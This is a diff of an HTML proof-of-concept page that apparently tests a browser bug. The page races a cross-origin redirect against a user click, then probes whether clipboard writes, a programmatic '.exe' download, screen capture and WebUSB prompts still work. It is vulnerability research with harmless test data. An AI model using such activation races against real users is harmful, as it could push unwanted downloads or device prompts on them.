@@ -1,106 +1,97 @@
 <!DOCTYPE html>
 <html>
-<body style="background:#111; color:#fff; text-align:center; font-family:sans-serif;">
+<body style="background:#111;color:#fff;text-align:center;font-family:sans-serif">
 
-<h2>Activation + Origin Desync PoC (EXTREME)</h2>
-<p>
-Click Start → fullscreen → press ESC  
-<br>
-Activation MUST die. Redirect MUST reset everything.
-</p>
+<h2>Activation Leak + Origin Desync (NO FULLSCREEN)</h2>
+<p>Click Start → redirect race → test activation-sensitive APIs</p>
 
-<button id="start" style="font-size:22px; padding:12px 24px;">Start</button>
+<button id="start" style="font-size:22px;padding:12px 24px">
+  Start
+</button>
 
-<pre id="log" style="text-align:left; margin:20px auto; width:80%; max-width:800px; background:#000; padding:16px; border-radius:8px; overflow:auto;"></pre>
+<pre id="log" style="text-align:left;margin:20px auto;width:85%;
+background:#000;padding:16px;border-radius:8px;max-width:900px;overflow:auto"></pre>
 
 <script>
-const out = msg => {
+const log = msg => {
   console.log("[PoC]", msg);
-  log.textContent += msg + "\n";
+  out.textContent += msg + "\n";
 };
+const out = document.getElementById("log");
 
-const log = document.getElementById("log");
+// ------------------------------------------------
+// ENV
+// ------------------------------------------------
+log("Origin: " + location.origin);
+log("UA: " + navigator.userAgent);
+log("-----------------------------------");
 
-// --------------------------------------------------
-// ENV INFO
-// --------------------------------------------------
-out("Origin: " + location.origin);
-out("UA: " + navigator.userAgent);
-out("Secure Context: " + window.isSecureContext);
-out("--------------------------------------------\n");
-
-// --------------------------------------------------
-// 1) USER GESTURE → FULLSCREEN
-// --------------------------------------------------
+// ------------------------------------------------
+// USER GESTURE
+// ------------------------------------------------
 start.onclick = async () => {
-  out("[STEP] requestFullscreen()");
-  try {
-    await document.documentElement.requestFullscreen();
-    out("[OK] Fullscreen entered. Press ESC now.");
-  } catch (e) {
-    out("[FAIL] Fullscreen blocked: " + e.name);
-  }
-};
+  log("[STEP] User clicked button → activation created");
 
-// --------------------------------------------------
-// 2) FULLSCREEN EXIT → REDIRECT RACE + TEST
-// --------------------------------------------------
-document.addEventListener("fullscreenchange", async () => {
-  const inFs = document.fullscreenElement !== null;
-  out("[EVENT] fullscreenchange → fullscreen=" + inFs);
-
-  if (inFs) return;
-
-  out("[STEP] ESC detected → scheduling redirect race");
-
-  // ----------------------------------------------
-  // 🔥 RACE: redirect to DIFFERENT ORIGIN
-  // ----------------------------------------------
+  // --------------------------------------------
+  // RACE: redirect to DIFFERENT origin
+  // --------------------------------------------
   requestAnimationFrame(() => {
     requestAnimationFrame(() => {
       setTimeout(() => {
-        out("[RACE] Redirecting to https://google.com:9090");
+        log("[RACE] Redirecting to https://google.com:9090");
         location.href = "https://google.com:9090";
       }, 60);
     });
   });
 
-  // ----------------------------------------------
-  // 3) ACTIVATION LEAK TESTS
-  // ----------------------------------------------
-  out("[TEST] Checking activation leakage…");
+  // --------------------------------------------
+  // ACTIVATION TESTS (SHOULD FAIL)
+  // --------------------------------------------
+  log("[TEST] Testing activation leakage…");
 
-  // CLIPBOARD
+  // Clipboard
   try {
-    await navigator.clipboard.writeText("LEAK");
-    out("[BUG] Clipboard write SUCCESS ❌ (activation leaked)");
+    await navigator.clipboard.writeText("ACTIVATION_LEAK");
+    log("[BUG] Clipboard write SUCCESS ❌");
   } catch (e) {
-    out("[OK] Clipboard blocked ✔");
+    log("[OK] Clipboard blocked ✔");
   }
 
-  // DOWNLOAD
+  // Programmatic download
   try {
     const b = new Blob(["TEST"], { type:"text/plain" });
     const u = URL.createObjectURL(b);
     const a = document.createElement("a");
     a.href = u;
-    a.download = "leak-test.exe";
+    a.download = "activation-test.exe";
     a.click();
-    out("[BUG] Programmatic download SUCCESS ❌");
+    log("[BUG] Programmatic download SUCCESS ❌");
   } catch {
-    out("[OK] Download blocked ✔");
+    log("[OK] Download blocked ✔");
   }
 
-  // SCREEN CAPTURE
-  try {
-    await navigator.mediaDevices.getDisplayMedia({ video:true });
-    out("[BUG] getDisplayMedia PROMPTED ❌");
-  } catch {
-    out("[OK] getDisplayMedia blocked ✔");
+  // Screen capture
+  if (navigator.mediaDevices?.getDisplayMedia) {
+    try {
+      await navigator.mediaDevices.getDisplayMedia({ video:true });
+      log("[BUG] getDisplayMedia PROMPTED ❌");
+    } catch {
+      log("[OK] getDisplayMedia blocked ✔");
+    }
   }
 
-  out("\n[DONE] If any ❌ appears → ACTIVATION LEAK + ORIGIN DESYNC");
-});
+  // WebUSB
+  if (navigator.usb) {
+    try {
+      await navigator.usb.requestDevice({ filters:[] });
+      log("[BUG] WebUSB requestDevice SUCCESS ❌");
+    } catch {
+      log("[OK] WebUSB blocked ✔");
+    }
+  }
+
+  log("\n[DONE] Any ❌ means ACTIVATION LEAK + ORIGIN DESYNC");
+};
 </script>
 
 </body>
